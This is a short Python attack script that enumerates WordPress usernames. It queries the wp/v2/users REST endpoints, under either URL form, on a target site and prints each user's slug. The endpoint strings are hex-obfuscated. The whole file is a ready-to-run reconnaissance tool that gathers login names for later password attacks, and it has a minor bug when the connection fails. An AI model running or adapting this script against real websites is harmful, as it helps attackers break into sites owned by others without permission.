# Author : ABDO10_DZ
# Tool : Automated Wordpress Users enumerator - with : rest_user
import requests
import sys
def help():
	print("methods : 0/1/all")
	print("python",sys.argv[0],"http://www.target.com/[path_to_WP] <method>")
	print("[Example]:",sys.argv[0],"http://www.target.com/wp 0")
def takeitout(target):
	try:
		res = requests.get(target)
	except Exception as e:
		print("[-] Connection Failed , Exception Error:",e)
	if (res.status_code != 200):
		print("[-] die code :" , res.status_code)
		return 1
	try:
		res = res.json()
	except Exception as e:
		print("[-] Failed, [WAF/NOT WP CMS] Exception Error:",e)
		return 1

	key = "\x73\x6c\x75\x67"

	for out in res:
		print("[+] Username :" ,out[key])

def main():
	x = 0
	#obfuscating for no resean i love'd that only
	json = "\x2f\x77\x70\x2d\x6a\x73\x6f\x6e\x2f\x77\x70\x2f\x76\x32\x2f\x75\x73\x65\x72\x73"
	rest = "\x3f\x72\x65\x73\x74\x5f\x72\x6f\x75\x74\x65\x3d\x2f\x77\x70\x2f\x76\x32\x2f\x75\x73\x65\x72\x73"
	if len(sys.argv) <= 2 :
		help()
		return 1
	else :
		target = sys.argv[1]
		method = sys.argv[2]
		if "http://" not in target and "https://" not in target:
			target = "http://" + target
	if method == "0":
		print("[*] Start enumerate on :",target,"using payload :",json)
		takeitout(target+json)
	elif method == "1":
		print("[*] Start enumerate on :",target,"using payload :",rest)
		takeitout(target+rest)
	elif method == "all":
		print("[*] Start enumerate on :",target,"using all payloads")
		for x in range(2):
			print("\n[*] Lunching rest_user method",x)
			if (x == 0):
				takeitout(target+json)
			else:
				takeitout(target+rest)
	else:
		print("[-] Unknown method , methods : 0/1/all")
		return 1

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print ('\nInterrupted : Quiting...')
        sys.exit(0)
